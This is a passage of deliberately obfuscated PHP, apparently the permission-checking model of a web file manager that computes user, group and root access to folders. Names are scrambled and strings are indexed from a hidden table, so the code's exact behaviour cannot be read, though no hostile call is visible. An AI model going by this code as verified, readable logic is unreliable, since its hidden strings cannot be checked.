$¾ÚÄÙ›á[$¦ˆµ¬í[582]] = rtrim($¾ÚÄÙ›á[$¦ˆµ¬í[588]], $¦ˆµ¬í[8]) . $¦ˆµ¬í[8] . ltrim($¾ÚÄÙ›á[$¦ˆµ¬í[582]], $¦ˆµ¬í[8]); $¶°‚‰ç‹[] = $¾ÚÄÙ›á; $ÊáŞ¢’Ï = count(explode($¦ˆµ¬í[8], trim($¾ÚÄÙ›á[$¦ˆµ¬í[582]], $¦ˆµ¬í[8]))); $²ˆÏªØÎ[] = $ÊáŞ¢’Ï + ($¾ÚÄÙ›á[$¦ˆµ¬í[33]] == $¦ˆµ¬í[78] ? 0 : 1000); } array_multisort($²ˆÏªØÎ, SORT_ASC, $¶°‚‰ç‹); return $¶°‚‰ç‹; } private function groupChidldAllRootSource($È·¥±Ø) { $—»“– =& $_SERVER[¿ğÚ‰±–]; $Òø¼ğé’ = Model($—»“–[2165])->groupChildrenAll($È·¥±Ø); $•Ä’ñ¨¸ = array($—»“–[192] => 0, $—»“–[569] => array($—»“–[7], $Òø¼ğé’), $—»“–[190] => SourceModel::TYPE_GROUP); $³ÑÎÛ‘Ø = Model($—»“–[902])->field($—»“–[193])->where($•Ä’ñ¨¸)->select(); $³ÑÎÛ‘Ø = array_to_keyvalue($³ÑÎÛ‘Ø, $—»“–[12], $—»“–[193]); return $³ÑÎÛ‘Ø; } private function authTargetInfo($‚’¸÷Æß) { $† ·à¡ =& $_SERVER[¿ğÚ‰±–]; $§Œ´ˆ­ç = array(); $å÷ıˆ»‰ = array(); $¥®Á°ô = 2 << 25; foreach ($‚’¸÷Æß as $µÍ —îÙ) { $Ê¿Å»çœ = Model($† ·à¡[571])->listData($µÍ —îÙ[$† ·à¡[2084]]); if (!$Ê¿Å»çœ) { continue; } if ($µÍ —îÙ[$† ·à¡[190]] == SourceModel::TYPE_USER) { $ÂÜºÁ™ì = Model($† ·à¡[577])->getInfoSimpleOuter($µÍ —îÙ[$† ·à¡[569]]); if ($ÂÜºÁ™ì[$† ·à¡[1777]] == $† ·à¡[1280]) { continue; } if ($ÂÜºÁ™ì[$† ·à¡[1777]] == $† ·à¡[228]) { $ÂÜºÁ™ì[$† ·à¡[32]] = LNG($† ·à¡[2166]); } } else { $ÂÜºÁ™ì = Model($† ·à¡[585])->getInfoSimple($µÍ —îÙ[$† ·à¡[569]]); } if (!$ÂÜºÁ™ì) { continue; } $ÂÜºÁ™ì[$† ·à¡[540]] = $Ê¿Å»çœ; $§Œ´ˆ­ç[] = $ÂÜºÁ™ì; $âú€¶¥ = 0; if ($µÍ —îÙ[$† ·à¡[190]] == SourceModel::TYPE_GROUP) { $âú€¶¥ = $¥®Á°ô * 2; } if ($µÍ —îÙ[$† ·à¡[190]] == SourceModel::TYPE_USER) { $âú€¶¥ = $¥®Á°ô; } if ($µÍ —îÙ[$† ·à¡[190]] == SourceModel::TYPE_USER && $µÍ —îÙ[$† ·à¡[569]] == $† ·à¡[228]) { $âú€¶¥ = 0; } $å÷ıˆ»‰[] = $Ê¿Å»çœ[$† ·à¡[487]] + $âú€¶¥; } array_multisort($å÷ıˆ»‰, SORT_DESC, $§Œ´ˆ­ç); return $§Œ´ˆ­ç; } public function getAllChildrenByUser($“ç’Õ¸, $ÓŒÕÇÕÇ) { $¦ò×¨º× =& $_SERVER[¿ğÚ‰±–]; $•ˆ„œê– = Model($¦ò×¨º×[598])->getInfo($ÓŒÕÇÕÇ); if (!$ÓŒÕÇÕÇ || !$“ç’Õ¸ || !$•ˆ„œê–) { return array(); } $çšŠÃŠª = Model($¦ò×¨º×[1425])->sourceInfo($“ç’Õ¸); $õÜèıÈÉ = array(); $•ËÊ²» = 1; if ($çšŠÃŠª[$¦ò×¨º×[192]] == $¦ò×¨º×[228] && $çšŠÃŠª[$¦ò×¨º×[569]] != $•ËÊ²» && $this->groupContainUser($çšŠÃŠª[$¦ò×¨º×[569]], $ÓŒÕÇÕÇ)) { foreach ($•ˆ„œê–[$¦ò×¨º×[2167]] as $ËÛ’»“Ù) { $™ŒÕ”á = Model($¦ò×¨º×[585])->getInfo($ËÛ’»“Ù[$¦ò×¨º×[1976]]); $ø¿Í¶Æè = Model($¦ò×¨º×[598])->getInfoSimpleOuter($ÓŒÕÇÕÇ); $ø¿Í¶Æè[$¦ò×¨º×[540]] = $ËÛ’»“Ù[$¦ò×¨º×[487]]; if (Model($¦ò×¨º×[571])->authCheckAction($ËÛ’»“Ù[$¦ò×¨º×[487]][$¦ò×¨º×[487]], $¦ò×¨º×[1997])) { continue; } $¤À¸îøÎ = array($¦ò×¨º×[32] => $¦ò×¨º×[1300] . $™ŒÕ”á[$¦ò×¨º×[32]], $¦ò×¨º×[193] => $™ŒÕ”á[$¦ò×¨º×[90]][$¦ò×¨º×[193]], $¦ò×¨º×[87] => KodIO::make($™ŒÕ”á[$¦ò×¨º×[90]][$¦ò×¨º×[193]]), $¦ò×¨º×[192] => $¦ò×¨º×[228], $¦ò×¨º×[190] => $¦ò×¨º×[578], $¦ò×¨º×[33] => $¦ò×¨º×[616], $¦ò×¨º×[582] => $™ŒÕ”á[$¦ò×¨º×[589]], $¦ò×¨º×[1976] => $™ŒÕ”á[$¦ò×¨º×[1976]], $¦ò×¨º×[586] => $™ŒÕ”á[$¦ò×¨º×[192]], $¦ò×¨º×[2164] => array($ø¿Í¶Æè)); $õÜèıÈÉ[$¤À¸îøÎ[$¦ò×¨º×[193]]] = $¤À¸îøÎ; } } $ÑÌ»Èåø = array(); $İ¨ñ¡¤ = $this->getAllChildren($“ç’Õ¸); foreach ($İ¨ñ¡¤ as $Ú¢Ç¼¿Œ) { $×ÙåŞÙ = !1; foreach ($Ú¢Ç¼¿Œ[$¦ò×¨º×[2164]] as $Ú•ô½–ã) { if ($Ú•ô½–ã[$¦ò×¨º×[1777]]) { if ($Ú•ô½–ã[$¦ò×¨º×[1777]] == $ÓŒÕÇÕÇ) { $×ÙåŞÙ = !0; break; } } if ($Ú•ô½–ã[$¦ò×¨º×[1976]]) { if ($this->groupContainUser($Ú•ô½–ã[$¦ò×¨º×[1976]], $ÓŒÕÇÕÇ)) { $×ÙåŞÙ = !0; break; } } } if ($×ÙåŞÙ) { $ÑÌ»Èåø[] = $Ú¢Ç¼¿Œ; } $µ•®šª = $Ú¢Ç¼¿Œ[$¦ò×¨º×[193]]; if (isset($õÜèıÈÉ[$µ•®šª])) { $Ú¢Ç¼¿Œ[$¦ò×¨º×[2164]][] = $õÜèıÈÉ[$µ•®šª][0]; $õÜèıÈÉ[$µ•®šª] = !1; } } $õÜèıÈÉ = array_filter(array_values($õÜèıÈÉ)); $ÑÌ»Èåø = array_merge($õÜèıÈÉ, $ÑÌ»Èåø); return $ÑÌ»Èåø; } public function setAllChildrenByUser($¬ãƒŸ‘÷, $«ÂÔÒş·, $®„îãÀ¨) { $äÆšÜ«» =& $_SERVER[¿ğÚ‰±–]; $¾†êÌÄÍ = $this->getAllChildrenByUser($¬ãƒŸ‘÷, $«ÂÔÒş·); if (!$®„îãÀ¨ || !$¾†êÌÄÍ) { return !1; } foreach ($¾†êÌÄÍ as $‘„ı‰úä) { $Âç›æœÚ = array(); foreach ($‘„ı‰úä[$äÆšÜ«»[2164]] as $å¦İÙ¨) { $ÈõßÅˆ = $å¦İÙ¨[$äÆšÜ«»[540]]; $Ü­Çâ¥‰ = $å¦İÙ¨[$äÆšÜ«»[1777]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $©€Ñ£­Í = $å¦İÙ¨[$äÆšÜ«»[1777]] ? $å¦İÙ¨[$äÆšÜ«»[1777]] : $å¦İÙ¨[$äÆšÜ«»[1976]]; if ($å¦İÙ¨[$äÆšÜ«»[1777]] && $å¦İÙ¨[$äÆšÜ«»[1777]] == $«ÂÔÒş·) { continue; } $Âç›æœÚ[] = array($äÆšÜ«»[193] => $‘„ı‰úä[$äÆšÜ«»[193]], $äÆšÜ«»[190] => $Ü­Çâ¥‰, $äÆšÜ«»[569] => intval($©€Ñ£­Í), $äÆšÜ«»[2084] => isset($ÈõßÅˆ[$äÆšÜ«»[475]]) ? intval($ÈõßÅˆ[$äÆšÜ«»[475]]) : 0, $äÆšÜ«»[2144] => isset($ÈõßÅˆ[$äÆšÜ«»[2144]]) ? intval($ÈõßÅˆ[$äÆšÜ«»[2144]]) : -1); } $Âç›æœÚ[] = array($äÆšÜ«»[193] => $‘„ı‰úä[$äÆšÜ«»[193]], $äÆšÜ«»[190] => SourceModel::TYPE_USER, $äÆšÜ«»[569] => intval($«ÂÔÒş·), $äÆšÜ«»[2084] => intval($®„îãÀ¨), $äÆšÜ«»[2144] => -1); $this->where(array($äÆšÜ«»[491] => $‘„ı‰úä[$äÆšÜ«»[193]]))->delete(); $this->addAll($Âç›æœÚ); } return !0; } public function get($”úıúş) { $ÕúóÙ™‘ = $this->getSourceList(array($”úıúş), !0); return $ÕúóÙ™‘[0]; } public function getSourceList($ƒÀñ“Ö, $˜Éá¿…¨ = false, $í¥©ß¥ = false) { $¿âÉõ¤Ë =& $_SERVER[¿ğÚ‰±–]; if (!$ƒÀñ“Ö) { return array(); } $†Ğˆ»Â¿ = Model($¿âÉõ¤Ë[1425]); if (!$˜Éá¿…¨ && count($ƒÀñ“Ö) == 1) { $˜Éá¿…¨ = array(); $˜Éá¿…¨[$ƒÀñ“Ö[0]] = $†Ğˆ»Â¿->sourceInfo($ƒÀñ“Ö[0]); } if (!$˜Éá¿…¨) { $¡‰­Êñ³ = array($¿âÉõ¤Ë[491] => array($¿âÉõ¤Ë[492], $ƒÀñ“Ö)); $˜Éá¿…¨ = $†Ğˆ»Â¿->field($¿âÉõ¤Ë[2168])->where($¡‰­Êñ³)->select(); $˜Éá¿…¨ = array_to_keyvalue($˜Éá¿…¨, $¿âÉõ¤Ë[193]); } $Ãïë†Øæ = $ƒÀñ“Ö; foreach ($˜Éá¿…¨ as $Õ—éö¨á => $ªşÎ¡¶) { $›¹ÂÙö = $†Ğˆ»Â¿->parentLevelArray($ªşÎ¡¶[$¿âÉõ¤Ë[584]]); $Ãïë†Øæ = array_merge($Ãïë†Øæ, array($Õ—éö¨á), array_reverse($›¹ÂÙö)); } $Ãïë†Øæ = array_values(array_unique($Ãïë†Øæ)); if (!$Ãïë†Øæ) { return array(); } $ª¬…Ôõ = $this->sourceAuthSelect($Ãïë†Øæ); $¯ê”­É = array(); foreach ($Ãïë†Øæ as $Ô¬ı„÷¹) { if (isset($ª¬…Ôõ[$Ô¬ı„÷¹])) { $¯ê”­É[$Ô¬ı„÷¹] = $ª¬…Ôõ[$Ô¬ı„÷¹]; } } $óŞªËİï = $this->userIsRoot($í¥©ß¥); $‚—á¯¡¦ = AuthModel::authAll(); $œ€Ü×é¤ = array($¿âÉõ¤Ë[488] => $‚—á¯¡¦, $¿âÉõ¤Ë[2169] => array($¿âÉõ¤Ë[493] => 0, $¿âÉõ¤Ë[1982] => $‚—á¯¡¦, $¿âÉõ¤Ë[494] => LNG($¿âÉõ¤Ë[2170]), $¿âÉõ¤Ë[1999] => $¿âÉõ¤Ë[2171])); $Ï¢—âÕˆ = array(); foreach ($˜Éá¿…¨ as $Ô¬ı„÷¹ => $ç¬‹¯ÌÉ) { if ($óŞªËİï && $GLOBALS[$¿âÉõ¤Ë[6]][$¿âÉõ¤Ë[1995]]) { $Ï¢—âÕˆ[$Ô¬ı„÷¹] = $œ€Ü×é¤; continue; } $Ï¢—âÕˆ[$Ô¬ı„÷¹] = $this->makeSourceAuth($ç¬‹¯ÌÉ, $¯ê”­É, $í¥©ß¥); } return $Ï¢—âÕˆ; } public function authDeepCheck($ªã¾öÄ˜, $¡†€ıòç = false) { $ûÑİ¬œ =& $_SERVER[¿ğÚ‰±–]; $¡†€ıòç = $¡†€ıòç ? $¡†€ıòç : USER_ID; $µÙğœ€ = $this->makeAuthDeep($¡†€ıòç); if (!in_array($ªã¾öÄ˜, $µÙğœ€[$ûÑİ¬œ[2172]])) { return !1; } $‚Ûâ„éÎ = array(); foreach ($µÙğœ€[$ûÑİ¬œ[2173]] as $ñÚÈ¸±… => $§¨—¡õ) { if (!in_array($ªã¾öÄ˜, $§¨—¡õ)) { continue; } $‚Ûâ„éÎ[] = $ñÚÈ¸±…; } if (!$‚Ûâ„éÎ) { return !1; } $Ÿ¬ØÓ«Ù = $‚Ûâ„éÎ ? $‚Ûâ„éÎ[0] : $ªã¾öÄ˜; return array($ûÑİ¬œ[488] => -1, $ûÑİ¬œ[540] => array($ûÑİ¬œ[493] => $ûÑİ¬œ[1280], $ûÑİ¬œ[1982] => $ûÑİ¬œ[228], $ûÑİ¬œ[494] => LNG($ûÑİ¬œ[2174]), $ûÑİ¬œ[1999] => $ûÑİ¬œ[2175]), $ûÑİ¬œ[2176] => LNG($ûÑİ¬œ[2177]), $ûÑİ¬œ[2178] => $this->sourceAuthInfo($Ÿ¬ØÓ«Ù)); } protected function makeAuthDeep($¢ÊáªÍÇ = false) { $íâÌ¾‡ç =& $_SERVER[¿ğÚ‰±–]; static $äÊ¿ğóÀ = array(); $¢ÊáªÍÇ = $¢ÊáªÍÇ ? $¢ÊáªÍÇ : USER_ID; if (isset($äÊ¿ğóÀ[$¢ÊáªÍÇ])) { return $äÊ¿ğóÀ[$¢ÊáªÍÇ]; } $ØÃÑºµä = Model($íâÌ¾‡ç[2179])->listData(); $…Â©¤Ê = array(); foreach ($ØÃÑºµä as $ø™’Ê‹Œ) { if ($ø™’Ê‹Œ[$íâÌ¾‡ç[487]] == 0 && $ø™’Ê‹Œ[$íâÌ¾‡ç[1998]] == $íâÌ¾‡ç[91]) { $…Â©¤Ê[] = $ø™’Ê‹Œ[$íâÌ¾‡ç[475]]; } } $’ñÕú = $this->userGroupParents($¢ÊáªÍÇ); $ĞĞÒßæ = array($íâÌ¾‡ç[190] => SourceModel::TYPE_USER, $íâÌ¾‡ç[569] => $¢ÊáªÍÇ); if ($’ñÕú) { $ĞĞÒßæ = array(array($íâÌ¾‡ç[190] => SourceModel::TYPE_USER, $íâÌ¾‡ç[569] => $¢ÊáªÍÇ), array($íâÌ¾‡ç[190] => SourceModel::TYPE_GROUP, $íâÌ¾‡ç[569] => array($íâÌ¾‡ç[492], $’ñÕú)), $íâÌ¾‡ç[1085] => $íâÌ¾‡ç[2078]); } $¤Çœ»› = $this->field($íâÌ¾‡ç[2180])->where($ĞĞÒßæ)->select(); $‹’³ü¥Õ = array(); $İœæ¾œ¾ = array_to_keyvalue_group($¤Çœ»›, $íâÌ¾‡ç[193]); foreach ($İœæ¾œ¾ as $Ä ­Š¦¶ => $¯ËµÜÆ) { $Ëºæ¾À = $this->authArrayCheck($¯ËµÜÆ, $¢ÊáªÍÇ); if ($Ëºæ¾À[$íâÌ¾‡ç[488]] > 0) { $‹’³ü¥Õ[] = $Ä ­Š¦¶ . $íâÌ¾‡ç[12]; } } if ($’ñÕú) { $±¢ô‡±· = Model($íâÌ¾‡ç[585]); foreach ($’ñÕú as $•¼Í€âÏ) { $¨óÖüå = $±¢ô‡±·->getInfo($•¼Í€âÏ); if (!$¨óÖüå || !is_array($¨óÖüå[$íâÌ¾‡ç[90]])) { continue; } $‹’³ü¥Õ[] = $¨óÖüå[$íâÌ¾‡ç[90]][$íâÌ¾‡ç[193]]; } } $ÙÕŸ™Ü = array(); $³×ñ˜Ï = $’ñÕú; $èü‰ú±ö = Model($íâÌ¾‡ç[1425]); $±¢ô‡±· = Model($íâÌ¾‡ç[585]); $Ù¾üíĞË = array(); $áßµÒ¬€ = array(); $é¹Ìãğ = array(); $åÈ¾»©‡ = array(); if ($‹’³ü¥Õ) { $÷¡£àß… = $èü‰ú±ö->where(array($íâÌ¾‡ç[193] => array($íâÌ¾‡ç[492], $‹’³ü¥Õ)))->select(); foreach ($÷¡£àß… as $Õªß”ôÆ) { $äÍïåß¥ = $èü‰ú±ö->parentLevelArray($Õªß”ôÆ[$íâÌ¾‡ç[584]]); $ÙÕŸ™Ü = array_merge($ÙÕŸ™Ü, $äÍïåß¥); $³×ñ˜Ï[] = $Õªß”ôÆ[$íâÌ¾‡ç[569]]; $Ù¾üíĞË[$Õªß”ôÆ[$íâÌ¾‡ç[193]]] = $äÍïåß¥; $áßµÒ¬€[$Õªß”ôÆ[$íâÌ¾‡ç[193]]] = $Õªß”ôÆ[$íâÌ¾‡ç[569]]; } } $³×ñ˜Ï = array_values(array_unique($³×ñ˜Ï)); $„ò„Ë€â = $³×ñ˜Ï; foreach ($„ò„Ë€â as $•¼Í€âÏ) { $¨óÖüå = $±¢ô‡±·->getInfo($•¼Í€âÏ); $äÍïåß¥ = $èü‰ú±ö->parentLevelArray($¨óÖüå[$íâÌ¾‡ç[584]]); $³×ñ˜Ï = array_merge($³×ñ˜Ï, $äÍïåß¥); } $³×ñ˜Ï = array_values(array_unique($³×ñ˜Ï)); foreach ($³×ñ˜Ï as $•¼Í€âÏ) { $¨óÖüå = $±¢ô‡±·->getInfo($•¼Í€âÏ); $ÙÕŸ™Ü[] = $¨óÖüå[$íâÌ¾‡ç[90]][$íâÌ¾‡ç[193]]; $é¹Ìãğ[$•¼Í€âÏ] = $¨óÖüå[$íâÌ¾‡ç[90]][$íâÌ¾‡ç[193]]; $åÈ¾»©‡[$•¼Í€âÏ] = $èü‰ú±ö->parentLevelArray($¨óÖüå[$íâÌ¾‡ç[584]]); } foreach ($Ù¾üíĞË as $ößµ³¹ => $à„¨¶¶š) { $£åšòÑ = $áßµÒ¬€[$ößµ³¹]; if (!$£åšòÑ || !$é¹Ìãğ[$£åšòÑ]) { continue; } $ï§³şö = array(); foreach ($åÈ¾»©‡[$£åšòÑ] as $•¼Í€âÏ) { $ï§³şö[] = $é¹Ìãğ[$•¼Í€âÏ]; } $Ù¾üíĞË[$ößµ³¹] = array_merge($ï§³şö, $à„¨¶¶š); } $ÙÕŸ™Ü = array_values(array_unique($ÙÕŸ™Ü)); $«­§òÛ© = array($íâÌ¾‡ç[2172] => $ÙÕŸ™Ü, $íâÌ¾‡ç[2173] => $Ù¾üíĞË); $äÊ¿ğóÀ[$¢ÊáªÍÇ] = $«­§òÛ©; return $«­§òÛ©; } private function makeSourceAuth($ÊœÍ’±©, $òÍĞªƒÓ, $ ì•áŒ‡ = false) { $ØÀŒéôƒ =& $_SERVER[¿ğÚ‰±–]; $¨Ëğ¡è— = $ØÀŒéôƒ[91]; $©“ĞÓ®Ç = $ÊœÍ’±©[$ØÀŒéôƒ[569]]; $¾€Ş±Úä = $ÊœÍ’±©[$ØÀŒéôƒ[190]] == SourceModel::TYPE_GROUP; $±¿ÑÓ¡ó = $¾€Ş±Úä ? $this->groupRootAuth($©“ĞÓ®Ç, $ ì•áŒ‡) : !1; if ($±¿ÑÓ¡ó && Model($ØÀŒéôƒ[571])->authCheckAction($±¿ÑÓ¡ó[$ØÀŒéôƒ[487]], $ØÀŒéôƒ[1997])) { return $this->groupAuthInfo($±¿ÑÓ¡ó, $©“ĞÓ®Ç); } $–®ñ¢ö˜ = Model($ØÀŒéôƒ[1425])->parentLevelArray($ÊœÍ’±©[$ØÀŒéôƒ[584]]); $–®ñ¢ö˜ = array_merge(array($ÊœÍ’±©[$ØÀŒéôƒ[193]]), array_reverse($–®ñ¢ö˜)); $ûÓ³ = !1; foreach ($–®ñ¢ö˜ as $•È½äÈ÷) { if (!isset($òÍĞªƒÓ[$•È½äÈ÷])) { continue; } $™ˆì˜ = $this->authMake($òÍĞªƒÓ[$•È½äÈ÷], $ ì•áŒ‡); if ($™ˆì˜[$ØÀŒéôƒ[540]]) { $ûÓ³ = $™ˆì˜; break; } } if (!$¾€Ş±Úä) { return $ûÓ³; } if (!$ûÓ³ && $±¿ÑÓ¡ó) { $ûÓ³ = $this->groupAuthInfo($±¿ÑÓ¡ó, $©“ĞÓ®Ç); } if (!$ûÓ³) { $»óª´ œ = Model($ØÀŒéôƒ[585])->getInfo($©“ĞÓ®Ç); $øæë†—› = explode($ØÀŒéôƒ[50], trim($»óª´ œ[$ØÀŒéôƒ[584]], $ØÀŒéôƒ[50])); $øæë†—› = array_reverse($øæë†—›); foreach ($øæë†—› as $šüÂøâ¿) { if ($šüÂøâ¿ == $ØÀŒéôƒ[228] || $šüÂøâ¿ == $¨Ëğ¡è—) { continue; } $°šèƒË = $this->groupRootAuth($šüÂøâ¿, $ ì•áŒ‡); if (!$°šèƒË) { continue; } $ûÓ³ = $this->groupAuthInfo($°šèƒË, $šüÂøâ¿); break; } } if (!$ûÓ³ || $ûÓ³[$ØÀŒéôƒ[488]] <= 0) { $Ğ¶Ôù£ = $this->authDeepCheck($ÊœÍ’±©[$ØÀŒéôƒ[193]], $ ì•áŒ‡); if ($Ğ¶Ôù£) { $ûÓ³ = $Ğ¶Ôù£; } } return $ûÓ³; } private function userIsRoot($êâìğ© = false) { $üêş£ =& $_SERVER[¿ğÚ‰±–]; if (!$êâìğ© && KodUser::isRoot()) { return !0; } $®ñ ¿Å = Model($üêş£[598])->getInfo($êâìğ©); $¥‹ı˜”ë = Model($üêş£[2181])->listData($®ñ ¿Å[$üêş£[2182]]); if ($¥‹ı˜”ë && $¥‹ı˜”ë[$üêş£[575]][$üêş£[2183]] == 1) { return !0; } return !1; } private function sourceAuthInfo($é…ª¿˜) { $š†µÜ•½ =& $_SERVER[¿ğÚ‰±–]; $Ê‡š°ú = Model($š†µÜ•½[1425]); $Î¿±×¥‹ = $Ê‡š°ú->sourceInfo($é…ª¿˜); if (!$Î¿±×¥‹) { return !1; } $Ê‡š°ú->groupPathDisplay($Î¿±×¥‹); $Ì÷ÉøŒ± = array($Î¿±×¥‹); $Ì÷ÉøŒ± = $Ê‡š°ú->_listAppendPath($Ì÷ÉøŒ±); $Î¿±×¥‹ = $Ì÷ÉøŒ±[0]; $¿¶€¦ = $Î¿±×¥‹[$š†µÜ•½[582]]; if (isset($Î¿±×¥‹[$š†µÜ•½[590]])) { $ÎÈ‘²ÑÔ = explode($š†µÜ•½[8], trim($Î¿±×¥‹[$š†µÜ•½[582]], $š†µÜ•½[8])); array_shift($ÎÈ‘²ÑÔ); $¿¶€¦ = $Î¿±×¥‹[$š†µÜ•½[588]] . $š†µÜ•½[2184] . implode($š†µÜ•½[8], $ÎÈ‘²ÑÔ); } return array($š†µÜ•½[494] => $Î¿±×¥‹[$š†µÜ•½[32]], $š†µÜ•½[87] => KodIO::make($Î¿±×¥‹[$š†µÜ•½[193]]), $š†µÜ•½[2185] => $¿¶€¦); } private function groupAuthInfo($ÍïÌ’©¾, $ù­·åÛ«) { $ŸŞæÑ¤ =& $_SERVER[¿ğÚ‰±–]; $³”İº = Model($ŸŞæÑ¤[585])->getInfo($ù­·åÛ«); return array($ŸŞæÑ¤[2186] => intval($ÍïÌ’©¾[$ŸŞæÑ¤[487]]), $ŸŞæÑ¤[2169] => $ÍïÌ’©¾, $ŸŞæÑ¤[2187] => LNG($ŸŞæÑ¤[2188]), $ŸŞæÑ¤[2178] => array($ŸŞæÑ¤[494] => $³”İº[$ŸŞæÑ¤[32]], $ŸŞæÑ¤[87] => KodIO::make($³”İº[$ŸŞæÑ¤[90]][$ŸŞæÑ¤[193]]), $ŸŞæÑ¤[2185] => $³”İº[$ŸŞæÑ¤[589]])); } protected function groupRootAuth($í¡÷ Ü, $’­¤¢Éô = false) { $æ‚Í¶íÙ =& $_SERVER[¿ğÚ‰±–]; $’­¤¢Éô = $’­¤¢Éô ? $’­¤¢Éô : USER_ID; $ˆÖ£Õ«÷ = $’­¤¢Éô . $æ‚Í¶íÙ[2189] . $í¡÷ Ü; static $½Ê™·ç² = array(); if (isset($½Ê™·ç²[$ˆÖ£Õ«÷])) { return $½Ê™·ç²[$ˆÖ£Õ«÷]; } $ñÒ‰×ÄÅ = Model($æ‚Í¶íÙ[585])->getInfo($í¡÷ Ü); $††ˆü = $this->userGroupList($’­¤¢Éô); $Ñû¥ÓÒÄ = isset($††ˆü[$í¡÷ Ü]) ? $††ˆü[$í¡÷ Ü][$æ‚Í¶íÙ[487]] : !1; if ($Ñû¥ÓÒÄ && Model($æ‚Í¶íÙ[571])->authCheckAction($Ñû¥ÓÒÄ[$æ‚Í¶íÙ[487]], $æ‚Í¶íÙ[1997])) { $½Ê™·ç²[$ˆÖ£Õ«÷] = $Ñû¥ÓÒÄ; return $Ñû¥ÓÒÄ; } $™ü©Õ—É = $this->sourceAuthSelect($ñÒ‰×ÄÅ[$æ‚Í¶íÙ[90]][$æ‚Í¶íÙ[193]]); $«µÄƒâ’ = $™ü©Õ—É ? $this->authMake($™ü©Õ—É, $’­¤¢Éô) : !1; $Ú‚¹èôÀ = $«µÄƒâ’ ? $«µÄƒâ’[$æ‚Í¶íÙ[540]] : !1; $½Ê™·ç²[$ˆÖ£Õ«÷] = $Ú‚¹èôÀ ? $Ú‚¹èôÀ : $Ñû¥ÓÒÄ; return $½Ê™·ç²[$ˆÖ£Õ«÷]; } public function authOwnerApply($ ×¢·Ç) { $©ÕÄ´§± =& $_SERVER[¿ğÚ‰±–]; if (empty($ ×¢·Ç[$©ÕÄ´§±[487]]) || isset($ ×¢·Ç[$©ÕÄ´§±[2190]]) && $ ×¢·Ç[$©ÕÄ´§±[2190]]) { return $ ×¢·Ç; } if (AuthModel::authCheckRoot($ ×¢·Ç[$©ÕÄ´§±[487]][$©ÕÄ´§±[488]])) { return $ ×¢·Ç; } $ˆºĞñÀ— = Model($©ÕÄ´§±[1425])->parentLevelArray($ ×¢·Ç[$©ÕÄ´§±[584]]); $ˆºĞñÀ— = array_merge(array($ ×¢·Ç[$©ÕÄ´§±[193]]), array_reverse($ˆºĞñÀ—)); $Œ’¸úú = $this->sourceAuthSelect($ˆºĞñÀ—); $£Ğ¤‹Ì = array(); $ŠÄ§•£– = array(); foreach ($Œ’¸úú as $ìçë÷¡Ú => $†Ê¼î„š) { $üˆ»Ë­ = $this->authFolderOwnerUser($†Ê¼î„š); $£Ğ¤‹Ì[$ìçë÷¡Ú] = $üˆ»Ë­; $ŠÄ§•£– = array_merge($ŠÄ§•£–, $üˆ»Ë­[$©ÕÄ´§±[662]]); if ($üˆ»Ë­[$©ÕÄ´§±[2191]]) { break; } } if (count($ŠÄ§•£–) == 0) { $ŠÄ§•£– = $this->authFolderOwnerGroup($ ×¢·Ç[$©ÕÄ´§±[569]]); } $ŠÄ§•£– = array_unique($ŠÄ§•£–); if (AuthModel::authCheckRoot($ ×¢·Ç[$©ÕÄ´§±[487]][$©ÕÄ´§±[488]])) { $ŠÄ§•£–[] = USER_ID; } $ ×¢·Ç[$©ÕÄ´§±[487]][$©ÕÄ´§±[2192]] = Model($©ÕÄ´§±[577])->userListInfo($ŠÄ§•£–); return $ ×¢·Ç; } private function authFolderOwnerGroup($ƒ˜®Éì¾) { $ú­´Ñğ =& $_SERVER[¿ğÚ‰±–]; $¸÷ä¦è‹ = Model($ú­´Ñğ[2070])->where(array($ú­´Ñğ[1976] => $ƒ˜®Éì¾))->select(); $º£Ôƒ” = array(); if (!$¸÷ä¦è‹) { return $º£Ôƒ”; } foreach ($¸÷ä¦è‹ as $±ÑåÉÏ) { $Ô®Ïè¶° = $this->authInfo($±ÑåÉÏ); if (AuthModel::authCheckRoot($Ô®Ïè¶°[$ú­´Ñğ[487]])) { $º£Ôƒ”[] = $±ÑåÉÏ[$ú­´Ñğ[1777]]; } } return $º£Ôƒ”; } private function authFolderOwnerUser($­‘¬İÊ§) { $«ö©ï¼ =& $_SERVER[¿ğÚ‰±–]; $¨Ÿ’ÀË§ = array(); $§¾”Ó…Ü = !1; foreach ($­‘¬İÊ§ as $æ»Äı°) { $ÛÏÍÃÍª = $this->authInfo($æ»Äı°); if ($æ»Äı°[$«ö©ï¼[569]] == $«ö©ï¼[228]) { $§¾”Ó…Ü = !0; } if ($æ»Äı°[$«ö©ï¼[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ÛÏÍÃÍª[$«ö©ï¼[487]])) { $¨Ÿ’ÀË§[] = $æ»Äı°[$«ö©ï¼[569]]; } } } return array($«ö©ï¼[662] => $¨Ÿ’ÀË§, $«ö©ï¼[2191] => $§¾”Ó…Ü); } public function authMake($Şƒ¶ÓÀ×, $ÌŞûëÂ = false) { $¶€š˜Œ× =& $_SERVER[¿ğÚ‰±–]; $”şäå’ú = $this->authArrayCheck($Şƒ¶ÓÀ×, $ÌŞûëÂ); if ($”şäå’ú[$¶€š˜Œ×[2193]]) { $”şäå’ú[$¶€š˜Œ×[2193]] = $this->sourceAuthInfo($”şäå’ú[$¶€š˜Œ×[2193]]); } return $”şäå’ú; } public function authArrayCheck($ÜıªãÀ·, $êÍñ†·¯ = false) { $òÇê–Ùî =& $_SERVER[¿ğÚ‰±–]; if (!$ÜıªãÀ·) { return array($òÇê–Ùî[488] => 0, $òÇê–Ùî[540] => !1); } $êÍñ†·¯ = $êÍñ†·¯ ? $êÍñ†·¯ : USER_ID; $£ıùŞöÈ = 0; $ÄÚÕãÈÖ = 0; $±¤áê…Û = 0; $±ä¬Ó÷Ö = 0; $«çğ½Ö = 0; $îºÁŠãí = 0; $‡Ôã¶Î… = 1000; $ßÙüõÛ¾ = 0; $ÜŠÜæ½ = 0; $‡¯©†¹Õ = 0; $‚æ£óÁÇ = 0; $„¥ÄÌ = array($òÇê–Ùî[193] => 0); foreach ($ÜıªãÀ· as $„¥ÄÌ) { $¢§éËØß = $this->authInfo($„¥ÄÌ); if (!$¢§éËØß) { continue; } $¥üü±ˆÓ = $„¥ÄÌ[$òÇê–Ùî[569]]; $Ğñ‚‰Õ§ = intval($¢§éËØß[$òÇê–Ùî[487]]); if ($„¥ÄÌ[$òÇê–Ùî[190]] == SourceModel::TYPE_USER && $¥üü±ˆÓ == $êÍñ†·¯) { $£ıùŞöÈ = !0; $±¤áê…Û = 